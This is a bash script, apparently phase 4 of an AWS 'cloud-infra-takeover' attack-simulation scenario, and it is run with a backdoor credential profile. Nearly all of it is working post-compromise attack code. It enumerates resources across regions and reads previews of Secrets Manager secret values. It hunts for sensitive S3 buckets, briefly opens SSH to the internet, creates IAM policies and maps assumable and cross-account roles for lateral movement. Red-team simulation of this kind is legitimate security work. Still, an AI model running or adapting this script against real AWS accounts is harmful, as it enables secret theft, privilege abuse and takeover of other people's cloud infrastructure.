#!/bin/bash

# File: test_scenarios/cloud-infra-takeover/04_impact_simulation.sh
# Phase 4: Impact Simulation - Demonstrate Attack Capabilities

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] Starting Phase 4: Impact Simulation${NC}"
echo -e "${YELLOW}[*] Demonstrating attack capabilities with established persistence${NC}"

# Use backdoor profile from previous phase
PROFILE="backdoor"

# Verify backdoor access
echo -e "${GREEN}[+] Verifying backdoor access...${NC}"
aws sts get-caller-identity --profile $PROFILE 2>/dev/null
if [ $? -ne 0 ]; then
    echo -e "${RED}[!] No backdoor profile found. Run 03_persistence.sh first${NC}"
    exit 1
fi

ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query Account --output text)
echo -e "${GREEN}[+] Using backdoor access in account: $ACCOUNT_ID${NC}"

# 1. Cross-Region Resource Enumeration
echo -e "\n${GREEN}[+] Phase 4A: Cross-Region Resource Enumeration${NC}"
REGIONS=("us-east-1" "us-east-2" "us-west-1" "us-west-2")

for region in "${REGIONS[@]}"; do
    echo -e "${YELLOW}[*] Enumerating resources in region: $region${NC}"
    
    # EC2 instances
    echo -e "  EC2 Instances:"
    aws ec2 describe-instances \
        --region $region \
        --profile $PROFILE \
        --query 'Reservations[].Instances[].[InstanceId,State.Name,InstanceType,PrivateIpAddress]' \
        --output table 2>/dev/null || echo "    No instances or access denied"
    
    # S3 buckets (global service, but check once)
    if [ "$region" = "us-west-2" ]; then
        echo -e "  S3 Buckets:"
        aws s3 ls --profile $PROFILE 2>/dev/null | head -10 || echo "    No buckets or access denied"
    fi
    
    # RDS instances  
    echo -e "  RDS Instances:"
    aws rds describe-db-instances \
        --region $region \
        --profile $PROFILE \
        --query 'DBInstances[].[DBInstanceIdentifier,DBInstanceStatus,Engine,MultiAZ]' \
        --output table 2>/dev/null || echo "    No RDS instances or access denied"
        
    # Lambda functions
    echo -e "  Lambda Functions:"
    aws lambda list-functions \
        --region $region \
        --profile $PROFILE \
        --query 'Functions[].[FunctionName,Runtime,LastModified]' \
        --output table 2>/dev/null | head -5 || echo "    No Lambda functions or access denied"
    
    echo ""
done

# 2. Secrets Enumeration and Access
echo -e "${GREEN}[+] Phase 4B: Secrets Enumeration Across Regions${NC}"
for region in "${REGIONS[@]}"; do
    echo -e "${YELLOW}[*] Checking Secrets Manager in $region${NC}"
    
    SECRETS=$(aws secretsmanager list-secrets \
        --region $region \
        --profile $PROFILE \
        --query 'SecretList[].Name' \
        --output text 2>/dev/null)
    
    if [ -n "$SECRETS" ] && [ "$SECRETS" != "None" ]; then
        echo -e "${RED}[!] Found secrets in $region:${NC}"
        for secret in $SECRETS; do
            echo -e "  - $secret"
            
            # Attempt to retrieve secret value (high impact)
            echo -e "${RED}[!] Attempting to retrieve secret: $secret${NC}"
            aws secretsmanager get-secret-value \
                --secret-id "$secret" \
                --region $region \
                --profile $PROFILE \
                --query 'SecretString' \
                --output text 2>/dev/null | cut -c1-100 | sed 's/^/      Secret preview: /' || echo "      Access denied or binary secret"
        done
    else
        echo -e "  No secrets found in $region"
    fi
done

# 3. High-Value Data Access Simulation
echo -e "\n${GREEN}[+] Phase 4C: High-Value Data Access Simulation${NC}"

# Look for buckets with sensitive data indicators
echo -e "${YELLOW}[*] Identifying high-value S3 buckets...${NC}"
aws s3 ls --profile $PROFILE 2>/dev/null | grep -E "(backup|secret|config|data|prod|confidential|private)" | while read -r line; do
    BUCKET_NAME=$(echo "$line" | awk '{print $3}')
    if [ -n "$BUCKET_NAME" ]; then
        echo -e "${RED}[!] High-value bucket identified: $BUCKET_NAME${NC}"
        
        # List contents without downloading (less destructive)
        echo -e "    Contents preview:"
        aws s3 ls s3://$BUCKET_NAME --profile $PROFILE 2>/dev/null | head -5 | sed 's/^/      /' || echo "      Access denied"
        
        # Check bucket policy
        echo -e "    Bucket policy status:"
        aws s3api get-bucket-policy-status --bucket $BUCKET_NAME --profile $PROFILE 2>/dev/null | jq -r '.PolicyStatus.IsPublic' | sed 's/^/      Public: /' || echo "      No bucket policy or access denied"
    fi
done

# 4. Infrastructure Manipulation Demonstration
echo -e "\n${GREEN}[+] Phase 4D: Infrastructure Manipulation Capabilities${NC}"

# Create test resources to show capability (non-destructive)
echo -e "${YELLOW}[*] Demonstrating resource creation capabilities...${NC}"

# Create test security group
echo -e "${GREEN}[+] Creating test security group...${NC}"
TEST_SG_NAME="test-attack-sg-$(date +%s)"
aws ec2 create-security-group \
    --group-name $TEST_SG_NAME \
    --description "Test security group for attack simulation" \
    --profile $PROFILE 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "${RED}[!] Successfully created security group: $TEST_SG_NAME${NC}"
    
    # Add dangerous rule (but don't leave it)
    aws ec2 authorize-security-group-ingress \
        --group-name $TEST_SG_NAME \
        --protocol tcp \
        --port 22 \
        --cidr 0.0.0.0/0 \
        --profile $PROFILE
    
    echo -e "${RED}[!] Added open SSH rule (0.0.0.0/0:22)${NC}"
    
    # Clean up immediately
    aws ec2 delete-security-group --group-name $TEST_SG_NAME --profile $PROFILE
    echo -e "${GREEN}[+] Test security group cleaned up${NC}"
fi

# Test IAM manipulation
echo -e "${GREEN}[+] Testing IAM manipulation capabilities...${NC}"
TEST_POLICY_NAME="TestAttackPolicy$(date +%s)"

cat > /tmp/test-policy.json << EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "s3:GetObject",
            "Resource": "*"
        }
    ]
}
EOF

aws iam create-policy \
    --policy-name $TEST_POLICY_NAME \
    --policy-document file:///tmp/test-policy.json \
    --description "Test policy for attack simulation" \
    --profile $PROFILE 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "${RED}[!] Successfully created IAM policy: $TEST_POLICY_NAME${NC}"
    
    # Clean up immediately
    aws iam delete-policy \
        --policy-arn "arn:aws:iam::$ACCOUNT_ID:policy/$TEST_POLICY_NAME" \
        --profile $PROFILE
    echo -e "${GREEN}[+] Test policy cleaned up${NC}"
fi

# 5. Network Access Testing
echo -e "\n${GREEN}[+] Phase 4E: Network Access Enumeration${NC}"

# VPC and subnet enumeration
echo -e "${YELLOW}[*] Enumerating network infrastructure...${NC}"
for region in us-west-2 us-east-1; do
    echo -e "Region: $region"
    
    # VPCs
    aws ec2 describe-vpcs \
        --region $region \
        --profile $PROFILE \
        --query 'Vpcs[].[VpcId,IsDefault,CidrBlock]' \
        --output table 2>/dev/null | sed 's/^/  /' || echo "  No VPCs or access denied"
    
    # Security Groups with open rules
    echo -e "  Security Groups with open access:"
    aws ec2 describe-security-groups \
        --region $region \
        --profile $PROFILE \
        --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].[GroupId,GroupName]' \
        --output table 2>/dev/null | sed 's/^/    /' || echo "    No security groups or access denied"
done

# 6. Lateral Movement Simulation
echo -e "\n${GREEN}[+] Phase 4F: Lateral Movement Simulation${NC}"

# Check for assumable roles
echo -e "${YELLOW}[*] Identifying assumable roles for lateral movement...${NC}"
aws iam list-roles \
    --profile $PROFILE \
    --query 'Roles[?contains(AssumeRolePolicyDocument, `ec2.amazonaws.com`) || contains(AssumeRolePolicyDocument, `lambda.amazonaws.com`)].{RoleName:RoleName,Description:Description}' \
    --output table 2>/dev/null | head -10 || echo "Access denied to list roles"

# Check for cross-account roles
echo -e "${YELLOW}[*] Checking for cross-account trust relationships...${NC}"
aws iam list-roles \
    --profile $PROFILE \
    --query 'Roles[?contains(AssumeRolePolicyDocument, `arn:aws:iam::`) && !contains(AssumeRolePolicyDocument, `'$ACCOUNT_ID'`)].{RoleName:RoleName,TrustedAccounts:AssumeRolePolicyDocument}' \
    --output json 2>/dev/null | jq -r '.[] | .RoleName' | head -5 | sed 's/^/  Cross-account role: /' || echo "  No cross-account roles found or access denied"

# 7. Impact Summary
echo -e "\n${RED}[!] ATTACK IMPACT SIMULATION COMPLETE${NC}"
echo -e "${YELLOW}[*] Demonstrated Capabilities:${NC}"
echo -e "  ✓ Cross-region resource enumeration"
echo -e "  ✓ Secrets Manager access across regions"
echo -e "  ✓ High-value S3 bucket identification"
echo -e "  ✓ Infrastructure resource creation/manipulation"
echo -e "  ✓ IAM policy management"
echo -e "  ✓ Network infrastructure enumeration"
echo -e "  ✓ Lateral movement path identification"

echo -e "\n${GREEN}[+] Attack simulation complete. No persistent damage caused.${NC}"
echo -e "${YELLOW}[*] Run cleanup.sh to remove all test resources${NC}"

# Clean up temp files
rm -f /tmp/test-policy.json